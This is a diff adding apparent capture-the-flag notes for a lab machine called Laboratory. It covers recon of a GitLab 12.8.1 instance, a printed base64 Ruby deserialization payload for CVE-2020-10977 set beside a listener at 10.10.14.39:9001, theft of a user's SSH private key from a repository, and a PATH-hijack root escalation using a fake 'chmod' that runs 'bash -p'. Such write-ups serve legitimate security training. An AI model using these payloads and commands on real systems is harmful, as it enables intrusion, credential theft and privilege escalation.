@@ -1,0 +1,91 @@
+# Recon
+
+## Port 80
+- Redirected to https://laboratory.htb
+
+## Port 443
+- Obtained hostname from ssl-cert
+-- git.laboratory.htb (vhost)
+
+## git.laboratory.htb
+- Gitlab instance 
+-- GitLab Community Edition 12.8.1 ( vulnerable to CVE-2020-10977)
+-- Register as iamf@laboratory.htb:iamfiamf
+-- Gitlab users: dexter
+
+
+# Exploit
+## Arbitary file read (CVE-2020-10977) to RCE
+- https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/
+- .dockerenv found
+- Payload: 
+-- 10.10.14.39:9001
+-- experimental_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgg6CUBzcmMiAqcEZXZhbCgnWTI5a1pTQTlJQ2RaTWpscldsTkJPVWxEVlc5Wk1qRlhaVWRTV0dKSWJHRlZNRVoxV1hwSk5XRnRSWGxXYWtKTFpXNVNjVlZHV2xOU1JsWkhWRzVhV2sxdVVuTmFSVTB4WkZad1dWa3lPVXBoYTFZelZFZHdSbVF3ZUhGU1ZFSk5ZV3N3TVZOWGJETmFNRGxWVVZoa1RsVXljek5UYTJoUFRVWndTR0pJVmsxaWEzQnpXV3BPUTJKSFNuQmhSM0JNVmtoT2NsbDZUbE5oTWtsNlZtcENUV0pyY0hOWmFrNURZa2RLY0dGSGNFeFdTRTV5V1hwT1UyRXhjRmxUYm14TlltdHdjMWxxVGtOaVIwcHdZVWR3VEZaSVRuSlplazVUWVRKR1dFNUlWbUZXTUZweFdWVlpOV015UmxoT1YzaHNUVE5vZWxwclpETlBWMHBFVGxod2ExTkZjSGRaTUZJd1pGWndXV0ZFUWtwU01uaDBVMVZrTTJSWFNraFdibFpoVFRGS2RsVkdVWGRrTURrMVlVVndWV1ZVVmpOWmFrNURZa2RLY0dGSVRrMVJNSEExVjFkc1NtTkhWWHBsUnpGaFUwaGtibGR0TVZKa1ZuQllVbTF3YUZKcWJIcFpWbU14WWtWc1NXUkVhR2xOTTJSdVYxaHJNV1F5VWxsVmJuQk1VbnBvTVZsNlRsTmxWMFpaVVZoQ1NsTkVSVFZUTVU1RFpWWndXVlJ0Y0d0V01WWnVXVzB4YzJNd2JFbE5SREJ3VEc1V2RXTkhSbXBoZVdkc1MwY3dkMHRUYTNWYWJXeDVZek5SUzJGWFdXZFZiRlpEVjFZNVVWUkZSbFZTYXpsVFZGTkJPV1pwUVhaaVdFNHpZVmMxT0dKWGJIVmFNMlE0WkRKc2RVMTZTWFpEYld4MVkwTkJPVWxGYkZCTWJrSjJZMGRXZFV0RFZXOWpibFpwWlZOcmMwbERWVzlrTWtsd1MxTkNlVnBZVG1wa1YxVm5ZbTFzYzBOdGJHMUpSMngxWTBGd2NHSnVRWFZrTTBwd1pFZFZiMWt5T1d0YVUydExZVmMxZDB4dFRuTmlNMDVzUTIxV2RWcEJjR3hpU0U1c1EyMXNiVWxEUldkVlNFcDJXVEpXZW1ONU5XMWlNMHB5UzBOclMxcFlXbWhpUTJocVlqSlNiRXRUUW5sYVdFNXFaRmRWWjJKdGJITkRiVloxV2tGd2JHSnRVVDBuTG5WdWNHRmpheWdpYlRBaUtTNW1hWEp6ZEFwcFppQlNWVUpaWDFCTVFWUkdUMUpOSUQxK0lDOXRjM2RwYm54dGFXNW5kM3gzYVc0ek1pOEthVzV3SUQwZ1NVOHVjRzl3Wlc0b0luSjFZbmtpTENBaWQySWlLU0J5WlhOamRXVWdibWxzQ21sbUlHbHVjQXBwYm5BdWQzSnBkR1VvWTI5a1pTa0thVzV3TG1Oc2IzTmxDbVZ1WkFwbGJITmxDa3RsY201bGJDNW1iM0pySUdSdkNtVjJZV3dvWTI5a1pTa0taVzVrQ21WdVpBcDdmUT09Jy51bnBhY2soJ20wJykuZmlyc3QpOg5AZmlsZW5hbWUiBjE6DEBsaW5lbm9pBjoMQG1ldGhvZDoLcmVzdWx0OglAdmFyIgxAcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOgZFVA==
+
+
+- Exfil repo in git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
+-- contains dexter's ssh private key
+
+
+# Privesc.
+- SUID binary with unquoted path /usr/local/bin/docker-security
+
+dexter@laboratory:/$ cat /etc/systemd/system/multi-user.target.wants/dockersecurity.service
+[Unit]
+Description=Docker Security
+After=docker.service
+BindsTo=docker.service
+ReloadPropagatedFrom=docker.service
+Wants=network-online.target docker.socket
+Requires=docker.socket
+
+[Service]
+ExecStart=/usr/local/bin/docker-security
+ExecReload=/usr/local/bin/docker-security
+
+[Install]
+WantedBy=multi-user.target
+dexter@laboratory:/$ cat /etc/systemd/system/default.target.wants/dockersecurity.service
+[Unit]
+Description=Docker Security
+After=docker.service
+BindsTo=docker.service
+ReloadPropagatedFrom=docker.service
+Wants=network-online.target docker.socket
+Requires=docker.socket
+
+[Service]
+ExecStart=/usr/local/bin/docker-security
+ExecReload=/usr/local/bin/docker-security
+
+[Install]
+WantedBy=multi-user.target
+dexter@laboratory:/$ cat /etc/systemd/system/dockersecurity.service
+[Unit]
+Description=Docker Security
+After=docker.service
+BindsTo=docker.service
+ReloadPropagatedFrom=docker.service
+Wants=network-online.target docker.socket
+Requires=docker.socket
+
+[Service]
+ExecStart=/usr/local/bin/docker-security
+ExecReload=/usr/local/bin/docker-security
+
+[Install]
+WantedBy=multi-user.target
+dexter@laboratory:/$ 
+
+
+dexter@laboratory:/dev/shm$ echo -e '#!/bin/bash\nbash -p' > chmod
+dexter@laboratory:/dev/shm$ chmod +x chmod
+dexter@laboratory:/dev/shm$ export PATH=/dev/shm:$PATH
+dexter@laboratory:/dev/shm$ which chmod
+/dev/shm/chmod
+dexter@laboratory:/dev/shm$ docker-security 
+
+# Clean up
+
+rm /dev/shm/chmod
+root@laboratory:/dev/shm# export PATH=${PATH/\/dev\/shm/}
